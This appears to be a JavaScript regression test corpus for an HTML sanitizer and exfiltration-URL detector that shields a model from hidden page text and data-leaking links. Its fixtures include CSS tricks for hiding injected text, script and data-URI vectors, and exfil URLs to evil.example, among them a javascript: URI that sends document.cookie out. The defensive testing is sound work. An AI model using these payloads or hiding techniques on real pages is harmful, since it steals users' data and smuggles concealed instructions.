/**
 * Persisted adversarial regression corpus for the HTML layer.
 *
 * The property suite fuzzes the pipeline with randomized inputs; this suite
 * pins specific known shapes that random generation may not reliably hit, so a
 * fixed verdict becomes an append-only seed and can never silently regress.
 *
 * Contract pinned here:
 *  - `hidden` vectors: elements invisible on a rendered page (hidden styles,
 *    `hidden` attr) are REMOVED — the canary never survives. HTML comments are
 *    NOT hidden content: they are preserved (see `visible` vectors).
 *  - `reported` vectors: scripting/resource tags and data: URIs are PRESERVED
 *    but flagged in `warned`, so the model can inspect page source while being
 *    told to distrust it.
 *  - `exfil` / `url` vectors: data-exfil-shaped URLs are DETECTED with a reason
 *    but never rewritten.
 */
import { describe, it } from "node:test";
import assert from "node:assert/strict";

import { sanitizeHtml, detectExfil, checkExfilUrl } from "../src/html.mjs";

const CANARY = "CANARY_d41d8c";
// Visible framing bytes on either side of the hidden element (T9): a splice must
// remove the canary WITHOUT touching the surrounding visible text. Kept on their
// own paragraphs (blank lines) so the `<div>` stays a flow HTML block — the same
// parse path the bare vectors originally exercised — while still being framed.
const FRAME_L = "framingLeftVISIBLE";
const FRAME_R = "framingRightVISIBLE";
const hidden = (decl) =>
  `${FRAME_L}\n\n<div style="${decl}">${CANARY}</div>\n\n${FRAME_R}`;
const NEEDLE = "q9X2mN7pK4rT8wY1cV5bZ3dF6gH0jL2e";
// RFC 4648 §5 url-safe base64 (`-`/`_` for `+`/`/`) carrying a contiguous 40+
// alnum run — a payload that dodges the standard `[A-Za-z0-9+/]` blob arms.
const B64URL_BLOB = "ab-cd_Zm9vQmFyMTIzZm9vQmFyMTIzZm9vQmFyMTIzeXo0NTY";

const CORPUS = {
  hidden: [
    { name: "display-none", input: hidden("display:none") },
    {
      name: "visibility-hidden",
      input: `${FRAME_L}\n\n<span style="visibility:hidden">${CANARY}</span>\n\n${FRAME_R}`,
    },
    {
      name: "opacity-zero",
      input: `${FRAME_L}\n\n<p style="opacity:0">${CANARY}</p>\n\n${FRAME_R}`,
    },
    { name: "offscreen-left", input: hidden("position:absolute;left:-9999px") },
    { name: "offscreen-top", input: hidden("position:fixed;top:-10000px") },
    {
      name: "clip-rect",
      input: hidden("clip:rect(0,0,0,0);position:absolute"),
    },
    { name: "text-indent", input: hidden("text-indent:-9999px") },
    { name: "zero-height-overflow", input: hidden("height:0;overflow:hidden") },
    {
      name: "zero-max-height-overflow",
      input: hidden("overflow:hidden;max-height:0"),
    },
    {
      name: "zero-max-width-overflow",
      input: hidden("overflow:hidden;max-width:0"),
    },
    { name: "font-size-zero", input: hidden("font-size:0") },
    { name: "font-size-near-zero", input: hidden("font-size:0.0001px") },
    { name: "clip-path-inset", input: hidden("clip-path:inset(50%)") },
    {
      name: "clip-path-inset-fractional",
      input: hidden("clip-path:inset(99.9%)"),
    },
    { name: "visibility-collapse", input: hidden("visibility:collapse") },
    { name: "opacity-near-zero", input: hidden("opacity:0.001") },
    { name: "opacity-negative", input: hidden("opacity:-1") },
    {
      name: "transform-scale-exponent",
      input: hidden("transform:scale(1e-3)"),
    },
    {
      name: "transform-translate-exponent",
      input: hidden("transform:translateX(-1e4px)"),
    },
    { name: "transform-scale-zero", input: hidden("transform:scale(0)") },
    {
      name: "transform-scale-near-zero",
      input: hidden("transform:scale(0.0001)"),
    },
    {
      name: "transform-rotatey-edge-on",
      input: hidden("transform:rotateY(90deg)"),
    },
    {
      name: "transform-rotatex-edge-on",
      input: hidden("transform:rotateX(90deg)"),
    },
    {
      name: "transform-translate-offscreen",
      input: hidden("transform:translateX(-9999px)"),
    },
    {
      name: "offscreen-left-vw",
      input: hidden("position:absolute;left:-100vw"),
    },
    { name: "transparent-text", input: hidden("color:transparent") },
    {
      name: "white-on-white",
      input: hidden("color:white;background-color:white"),
    },
    {
      name: "white-on-white-mixed-notation",
      input: hidden("color:#FFFFFF;background-color:rgb(255, 255, 255)"),
    },
    {
      name: "white-on-white-hsl",
      input: hidden("color:hsl(0 0% 100%);background-color:white"),
    },
    {
      name: "bare-hidden-attr",
      input: `${FRAME_L}\n\n<div hidden>${CANARY}</div>\n\n${FRAME_R}`,
    },
    {
      // A malformed sibling declaration (`x`, no colon) must not blank
      // detection of the valid `display:none` next to it — a browser
      // recovers per-declaration and still hides the element.
      name: "malformed-decl-does-not-block-detection",
      input: hidden("x;display:none"),
    },
    {
      // A CSS hex-escaped keyword decodes to `none` in a real browser.
      name: "css-escaped-display-none",
      input: hidden("display:no\\6e e"),
    },
    {
      name: "hidden-span-in-heading",
      input: `# Title <span style="display:none">${CANARY}</span> end`,
      keep: ["Title", "end"],
    },
    {
      name: "hidden-span-in-list-item",
      input: `- item <span hidden>${CANARY}</span> tail`,
      keep: ["item", "tail"],
    },
    {
      name: "hidden-div-in-blockquote",
      input: `> visible-before\n> <div hidden>${CANARY}</div>\n> visible-after`,
      keep: ["visible-before", "visible-after"],
    },
  ],
  reported: [
    {
      name: "script-tag",
      input: `<script>${CANARY}</script>OK`,
      tag: "script",
    },
    {
      name: "style-tag",
      input: `<style>body{}${CANARY}</style>OK`,
      tag: "style",
    },
    {
      name: "iframe-src",
      input: `<iframe src="x/${CANARY}"></iframe>OK`,
      tag: "iframe",
    },
    {
      name: "iframe-srcdoc",
      input: `<iframe srcdoc="${CANARY}"></iframe>OK`,
      tag: "iframe",
    },
    {
      name: "object-data",
      input: `<object data="data:text/html,${CANARY}"></object>OK`,
      tag: "object",
    },
    {
      name: "svg-image-href",
      input: `<svg><image href="x/${CANARY}"/></svg>OK`,
      tag: "svg",
    },
    {
      name: "svg-use-href",
      input: `<svg><use href="#${CANARY}"/></svg>OK`,
      tag: "svg",
    },
    {
      name: "style-import",
      input: `<style>@import "${CANARY}";</style>OK`,
      tag: "style",
    },
    {
      name: "embed-data-uri",
      input: `<embed src="data:text/html,${CANARY}">OK`,
      tag: "embed",
    },
    { name: "math-tag", input: `<math>${CANARY}</math>OK`, tag: "math" },
  ],
  exfil: [
    {
      // A payload-shaped (44-char base64) value: a SHORT keyword-param value
      // like `payload=QUJDRE…` no longer flags on the name alone (finding #20).
      name: "link-query-base64",
      input: `[c](https://evil.example/t?payload=${"A".repeat(44)})`,
      reason: "suspicious query parameter",
      isImage: false,
      autoFetched: false,
    },
    {
      name: "image-query-base64",
      input: `![i](https://evil.example/p.png?data=${"A".repeat(44)})`,
      reason: "suspicious query parameter",
      isImage: true,
      autoFetched: true,
    },
    {
      name: "unparseable-host-flagged-url",
      input: "[x](https://�evil.example/log?token=" + "A".repeat(44) + ")",
      reason: "suspicious query parameter",
      isImage: false,
      autoFetched: false,
    },
    {
      name: "data-uri-active-image",
      input: "![i](data:text/html;base64,PHNjcmlwdD5ldmlsPC9zY3JpcHQ+)",
      reason: "active-content data: URI",
      isImage: true,
      autoFetched: true,
    },
    {
      name: "off-origin-form-action",
      input: '<form action="https://evil.example/exfil"><input name=x></form>',
      reason: "off-origin form action",
      isImage: false,
      autoFetched: true,
    },
    {
      name: "meta-refresh-off-origin",
      input:
        '<meta http-equiv="refresh" content="0; url=https://evil.example/r">',
      reason: "off-origin meta-refresh redirect",
      isImage: false,
      autoFetched: true,
    },
    {
      name: "srcset-beacon",
      input: `<img srcset="https://evil.example/p.png?data=${"A".repeat(44)} 2x">`,
      reason: "suspicious query parameter",
      isImage: true,
      autoFetched: true,
    },
    {
      name: "ping-beacon",
      input: `<a href="/ok" ping="https://evil.example/t?exfil=${"A".repeat(44)}">x</a>`,
      reason: "suspicious query parameter",
      isImage: false,
      autoFetched: true,
    },
    {
      // H6: a srcset candidate URL that itself contains commas (a data: URI)
      // must survive candidate splitting intact. A naive split(",") shredded it
      // into `data:image/svg+xml` + junk and missed the active-content payload.
      name: "srcset-data-uri-with-comma",
      input: `<img srcset="data:image/svg+xml,<svg/onload=x> 2x">`,
      reason: "active-content data: URI",
      isImage: true,
      autoFetched: true,
    },
  ],
  url: [
    {
      // A keyword param flags only when its value is payload-shaped: a 44-char
      // base64 blob in `token=` is exfil; a short `?token=abc` is not (#20).
      name: "token-query-param",
      input: `https://evil.example/log?token=${"A".repeat(44)}`,
      reason: "suspicious query parameter",
    },
    {
      name: "userinfo-credentials",
      input: `https://user:${NEEDLE}@evil.example/p`,
      reason: "embedded credentials",
    },
    {
      name: "oversized-fragment",
      input: "https://ok.example/#" + "A".repeat(220),
      reason: "unusually long fragment",
    },
    {
      name: "fragment-keyword-exfil",
      input: `https://ok.example/p#token=${"a".repeat(64)}`,
      reason: "suspicious query parameter",
    },
    {
      name: "query-base64-blob",
      input: "https://ok.example/p?d=" + "A".repeat(60),
      reason: "suspicious query parameter",
    },
    {
      name: "query-hex-blob",
      input: "https://ok.example/p?h=" + "a".repeat(40),
      reason: "suspicious query parameter",
    },
    {
      name: "template-injection",
      input: "https://ok.example/p?x=${SECRET}",
      reason: "suspicious query parameter",
    },
    {
      // One benign param (`page=2`) plus one payload-shaped keyword param: a
      // SHORT `session=abcdef` no longer flags on the name alone (#20).
      name: "multi-param-one-exfil",
      input: `https://ok.example/p?page=2&session=${"A".repeat(44)}`,
      reason: "suspicious query parameter",
    },
    {
      name: "oversized-query-string",
      input: "https://ok.example/p?note=" + "-".repeat(220),
      reason: "unusually long query string",
    },
    {
      name: "data-uri-active-svg",
      input: "data:image/svg+xml,<svg/onload=x>",
      reason: "active-content data: URI",
    },
    {
      name: "data-uri-oversized",
      input: "data:application/octet-stream;base64," + "A".repeat(5000),
      reason: "oversized inline data: payload",
    },
    {
      name: "javascript-uri",
      input: "javascript:fetch('https://evil.example/?d='+document.cookie)",
      reason: "script-executing URI",
    },
    {
      name: "credential-shaped-param",
      input: `https://ok.example/p?u=ghp_0a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6q7`,
      reason: "credential-shaped token in URL parameter",
    },
    {
      name: "path-segment-blob",
      input: "https://evil.example/" + "A".repeat(220),
      reason: "encoded data blob in path segment",
    },
    {
      name: "fragment-param-blob",
      input: "https://ok.example/p?a=1#x=" + "a".repeat(64),
      reason: "suspicious query parameter",
    },
    {
      // Retained true positive for finding #20: a long high-entropy value in a
      // keyword param IS payload-shaped and still flags after the name-only arm
      // was replaced by value-gating.
      name: "keyword-data-blob-retained",
      input: "https://evil.example/c?data=" + "A".repeat(64),
      reason: "suspicious query parameter",
    },
    {
      // S4: url-safe base64 (`-`/`_`) blob in a keyword query param.
      name: "b64url-keyword-query",
      input: `https://evil.example/log?token=${B64URL_BLOB}`,
      reason: "suspicious query parameter",
    },
    {
      // S4: url-safe base64 blob in a non-keyword param (post-parse walk).
      name: "b64url-nonkeyword-query",
      input: `https://evil.example/p?h=${B64URL_BLOB}`,
      reason: "suspicious query parameter",
    },
    {
      // S4: url-safe base64 blob in a fragment param.
      name: "b64url-fragment",
      input: `https://ok.example/p?a=1#data=${B64URL_BLOB}`,
      reason: "suspicious query parameter",
    },
    {
      // S4: url-safe base64 blob smuggled in a path segment (beacon w/o query).
      name: "b64url-path-segment",
      input: `https://evil.example/${"Zm9vQmFyMTIz".repeat(11)}-_`,
      reason: "encoded data blob in path segment",
    },
    {
      // Percent-encoded blob: the raw value is percent-escapes, not a blob
      // shape, but it decodes to a 40+ run of "A"s.
      name: "percent-encoded-blob",
      input: "https://evil.example/log?q=" + "%41".repeat(40),
      reason: "suspicious query parameter",
    },
  ],
  urlBenign: [
    { name: "fragment-anchor", input: "https://ok.example/page#section-2" },
    { name: "safe-query", input: "https://ok.example/safe?q=hello" },
    // Finding #20 precision corpus: keyword-named params whose VALUE is short /
    // low-entropy must NOT flag on the param name alone. Each of these used to
    // fire ("?key=", "?d=", "?session=", "?auth=") and drowned the real signal.
    { name: "keyword-utm-source", input: "https://e.com/p?utm_source=news" },
    { name: "keyword-short-gclid", input: "https://e.com/p?gclid=Cj0short" },
    { name: "keyword-d-3", input: "https://e.com/p?d=3" },
    {
      name: "keyword-public-mapkey",
      input: "https://e.com/p?key=pk_public_mapkey",
    },
    { name: "keyword-session-ok", input: "https://e.com/p?session=ok" },
    { name: "keyword-cursor-abc", input: "https://e.com/p?cursor=abc" },
    { name: "keyword-auth-ok", input: "https://e.com/p?auth=ok" },
    {
      // H4: a benign path-like value whose "authorization" keyword and 20-char
      // run sit in DIFFERENT places must not read as a credential — the secret
      // shape has to match on the same contiguous opaque run.
      name: "authorization-redirect-path",
      input:
        "https://ok.example/callback?redirect=/authorization-service/session/abcdefghij1234567890",
    },
    {
      // A prose value containing the word "token" split by hyphens is not a
      // contiguous opaque credential run.
      name: "token-word-in-prose-path",
      input:
        "https://ok.example/p?next=/reset-token-flow/step-2/confirmation-page-1234",
    },
    { name: "small-data-image", input: "data:image/png;base64,iVBORw0KGgo=" },
    {
      name: "signed-cdn-link",
      input:
        "https://cdn.example.com/a.js?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAEX%2F20240101%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20240101T000000Z&X-Amz-Expires=3600&X-Amz-SignedHeaders=host&X-Amz-Signature=" +
        "a".repeat(64),
    },
    {
      name: "pagination-cursor",
      input:
        "https://api.example.com/items?cursor=eyJpZCI6OTk5OTl9&limit=50&page=3",
    },
    {
      name: "analytics-params",
      input:
        "https://example.com/p?utm_source=news&utm_campaign=spring2024edition&gclid=QUJD" +
        "A".repeat(60),
    },
    {
      name: "long-hyphenated-slug",
      input: "https://ok.example/the-" + "quick-".repeat(40) + "end",
    },
    {
      // Percent-encoded but decodes to something short — must not flag.
      name: "percent-encoded-short",
      input: "https://ok.example/p?q=%41%42%43",
    },
    {
      // Malformed percent-sequence: decodeURIComponent throws — fail open.
      name: "malformed-percent-sequence",
      input: "https://ok.example/p?q=%zzinvalid",
    },
    // S4 precision: legit url-safe shapes must NOT be mistaken for a blob.
    {
      // A url-safe slug: hyphen-separated words, no contiguous 40-char run.
      name: "b64url-safe-slug",
      input:
        "https://e.com/p?ref=spring-2024-promo-code-alpha-beta-gamma-delta-epsilon",
    },
    {
      // JWT-looking but dot-separated: each part is below the blob threshold.
      name: "jwt-looking-benign",
      input:
        "https://e.com/p?ref=eyJhbGciOiJIUzI1.eyJzdWIiOiIxMjM0.SflKxwRJSMeKKF2",
    },
    {
      // An allowlisted signing param may legitimately carry a url-safe blob.
      name: "b64url-in-x-amz-signature",
      input: `https://cdn.x/a?X-Amz-Signature=${B64URL_BLOB}`,
    },
    {
      // A pagination cursor may legitimately carry a url-safe blob.
      name: "b64url-in-cursor",
      input: `https://api.x/items?cursor=${B64URL_BLOB}`,
    },
    {
      // An analytics param may legitimately carry a url-safe blob.
      name: "b64url-in-utm",
      input: `https://x.com/p?utm_content=${B64URL_BLOB}`,
    },
  ],
  // Visible content that earlier over-eager hiding heuristics could splice. A
  // false positive here DELETES legitimate text the model needed, so each row
  // pins that the canary SURVIVES — the precision counterpart to `hidden`.
  visible: [
    // Comments are preserved — invisible on a rendered page, but ubiquitous in
    // legitimate documents (PR templates, tooling markers); splicing them
    // corrupted real content, so every comment form must survive.
    { name: "html-comment", input: `text<!-- ${CANARY} -->OK` },
    { name: "bogus-comment", input: `text <!${CANARY}> OK` },
    { name: "cdata-comment", input: `text <![CDATA[${CANARY}]]> OK` },
    { name: "processing-instruction", input: `text <?php ${CANARY} ?> OK` },
    {
      name: "small-negative-left",
      input: hidden("position:absolute;left:-5px"),
    },
    // ── precision regressions for findings H1–H3 (must NOT splice) ──
    {
      // H3: a flat background color under a url() IMAGE layer is not provably
      // the rendered backdrop — the image can paint over same-colored text.
      name: "same-color-over-bg-image",
      input: hidden("color:#000;background:rgb(0,0,0) url(dark.png)"),
    },
    {
      name: "white-on-white-over-gradient",
      input: hidden("color:#fff;background:#fff linear-gradient(#fff,#000)"),
    },
    {
      // H1: gradient-clipped heading — transparent color, but the gradient is
      // painted through the glyphs via background-clip:text.
      name: "gradient-clipped-heading",
      input: hidden(
        "color:transparent;background:linear-gradient(90deg,#f00,#00f);-webkit-background-clip:text;background-clip:text",
      ),
    },
    {
      // H1: -webkit-text-fill-color overrides transparent `color` for the fill.
      name: "text-fill-color-visible",
      input: hidden("color:transparent;-webkit-text-fill-color:#111"),
    },
    {
      // H2: only the top half is clipped — the bottom stays on screen.
      name: "clip-path-inset-top-half",
      input: hidden("clip-path:inset(50% 0 0 0)"),
    },
    {
      name: "clip-path-inset-one-open-edge",
      input: hidden("clip-path:inset(50% 50% 50% 10%)"),
    },
    {
      name: "half-shift-vw",
      input: hidden("position:absolute;left:-50vw"),
    },
    {
      name: "half-shift-percent",
      input: hidden("position:absolute;left:-50%"),
    },
    {
      name: "in-flow-calc-left",
      input: hidden("position:absolute;left:calc(100% - 5px)"),
    },
    {
      name: "negative-viewport-calc",
      input: hidden("position:fixed;left:calc(-100vw)"),
    },
    { name: "hanging-text-indent", input: hidden("text-indent:-0.5em") },
    { name: "dim-opacity", input: hidden("opacity:0.15") },
    { name: "opacity-near-opaque", input: hidden("opacity:0.9") },
    { name: "small-font", input: hidden("font-size:11px") },
    { name: "mild-scale", input: hidden("transform:scale(0.8)") },
    { name: "enlarging-scale-exponent", input: hidden("transform:scale(1e3)") },
    { name: "near-edge-rotate", input: hidden("transform:rotateY(89deg)") },
    { name: "in-plane-rotate", input: hidden("transform:rotate(90deg)") },
    { name: "partial-clip-inset", input: hidden("clip-path:inset(10%)") },
    { name: "color-without-bg", input: hidden("color:white") },
    {
      name: "near-white-mismatch",
      input: hidden("color:white;background:#fefefe"),
    },
    { name: "distinct-grays", input: hidden("color:#777;background:#888") },
    {
      // aria-hidden removes an element only from the ACCESSIBILITY TREE, not
      // the rendered page — a sighted human still sees it.
      name: "aria-hidden-span",
      input: `<span aria-hidden="true">${CANARY}</span>`,
    },
    {
      // A zero width/height with the default overflow:visible still paints
      // overflowing children — content stays on screen.
      name: "zero-height-no-overflow",
      input: hidden("height:0"),
    },
    {
      name: "zero-width-no-overflow",
      input: hidden("width:0"),
    },
    {
      // A nonzero unitless length is INVALID CSS; a browser drops the whole
      // declaration and the element keeps its normal on-screen position.
      name: "unitless-offscreen-invalid",
      input: hidden("position:absolute;left:-9999"),
    },
    {
      name: "unitless-text-indent-invalid",
      input: hidden("text-indent:-9999"),
    },
    {
      // A malformed declaration (`x`) in a style string must not blank
      // detection of the REST of the style — but salvage also must not
      // manufacture a false positive out of the broken half.
      name: "malformed-decl-does-not-poison-valid-sibling",
      input: hidden("bad!!!;color:red"),
    },
  ],
};

describe("corpus: hidden content never survives sanitizeHtml", () => {
  for (const { name, input, keep } of CORPUS.hidden) {
    it(`removes ${name}`, () => {
      const out = sanitizeHtml(input)?.text ?? input;
      assert.equal(out.includes(CANARY), false, `survived: ${name}`);
      // The splice must be surgical: adjacent visible framing bytes survive
      // byte-for-byte (T9). `keep` names them for custom vectors; the rest use
      // the FRAME_L/FRAME_R sentinels the `hidden()` helper wraps around.
      const framing =
        keep ?? [FRAME_L, FRAME_R].filter((m) => input.includes(m));
      assert.ok(framing.length > 0, `no framing asserted for ${name}`);
      for (const marker of framing)
        assert.ok(out.includes(marker), `framing "${marker}" lost in ${name}`);
    });
  }
});

describe("corpus: visible content is never spliced (precision)", () => {
  for (const { name, input } of CORPUS.visible) {
    it(`keeps ${name}`, () => {
      const out = sanitizeHtml(input)?.text ?? input;
      assert.equal(out.includes(CANARY), true, `spliced visible: ${name}`);
    });
  }
});

describe("corpus: scripting/resource content survives and is reported", () => {
  for (const { name, input, tag } of CORPUS.reported) {
    it(`preserves and flags ${name}`, () => {
      const result = sanitizeHtml(input);
      assert.notEqual(result, null, `not flagged: ${name}`);
      assert.equal(result.text, input, `modified: ${name}`);
      assert.ok(
        (result.warned.tags[tag] ?? 0) > 0,
        `<${tag}> not counted: ${name}`,
      );
    });
  }
  it("counts a data: URI resource", () => {
    const result = sanitizeHtml(`<embed src="data:text/html,${CANARY}">OK`);
    assert.equal(result.warned.dataSrc, 1);
  });
});

describe("corpus: exfil links/images are detected, never rewritten", () => {
  for (const { name, input, reason, isImage, autoFetched } of CORPUS.exfil) {
    it(`flags ${name}`, () => {
      const threats = detectExfil(input);
      assert.notEqual(threats, null, `not flagged: ${name}`);
      assert.equal(threats[0].reason, reason);
      assert.equal(threats[0].isImage, isImage);
      // `autoFetched` is what the severity tier reads (see output.mjs), and it
      // is NOT `isImage`: a form action and a meta refresh fire on their own
      // without being images, while an anchor href does not fire at all.
      assert.equal(threats[0].autoFetched, autoFetched, `autoFetched: ${name}`);
    });
  }
});

describe("corpus: checkExfilUrl verdicts", () => {
  for (const { name, input, reason } of CORPUS.url) {
    it(`flags ${name} as "${reason}"`, () =>
      assert.equal(checkExfilUrl(input), reason));
  }
  for (const { name, input } of CORPUS.urlBenign) {
    it(`leaves ${name} alone`, () => assert.equal(checkExfilUrl(input), null));
  }
});
